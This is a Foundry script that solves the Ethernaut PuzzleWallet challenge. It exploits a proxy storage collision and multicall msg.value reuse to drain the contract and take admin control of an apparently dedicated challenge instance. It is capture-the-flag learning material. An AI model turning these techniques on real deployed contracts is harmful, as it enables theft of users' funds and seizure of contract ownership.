// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/EthernautPuzzleWallet.sol";

contract PuzzleWalletSolution is Script {
    PuzzleProxy proxy =
        PuzzleProxy(payable(0xA8C8152207277b839Ccc26A7959297Be6344D0aA));
    address myWallet = vm.envAddress("MY_ADDRESS");

    bytes[] innerData = [
        abi.encodeWithSelector(bytes4(0xd0e30db0)) // deposit
    ];
    bytes[] data = [
        abi.encodeWithSelector(bytes4(0xd0e30db0)), // deposit
        abi.encodeWithSelector(bytes4(0xac9650d8), innerData) // multicall(deposit)
    ];

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        (bool success, ) = address(proxy).call(
            abi.encodeWithSelector(bytes4(0xa6376746), myWallet)
        );
        require(success, "Call failed");
        (success, ) = address(proxy).call(
            abi.encodeWithSelector(bytes4(0xe43252d7), myWallet)
        );
        require(success, "Second call failed");
        (success, ) = address(proxy).call{value: 0.001 ether}(
            abi.encodeWithSelector(bytes4(0xac9650d8), data)
        ); // Ini calling multicall function
        require(success, "Third call failed");

        // Withdraw only the credited amount (0.002 ether)
        (success, ) = address(proxy).call(
            abi.encodeWithSelector(
                bytes4(0xb61d27f6),
                myWallet,
                0.002 ether,
                ""
            )
        );
        require(success, "Fourth call failed");
        (success, ) = address(proxy).call(
            abi.encodeWithSelector(
                bytes4(0x9d51d9b7),
                uint256(uint160(myWallet))
            )
        );

        vm.stopBroadcast();
        console.log("Current admin", proxy.admin());
        console.log("Current pending admin", proxy.pendingAdmin());
    }
}
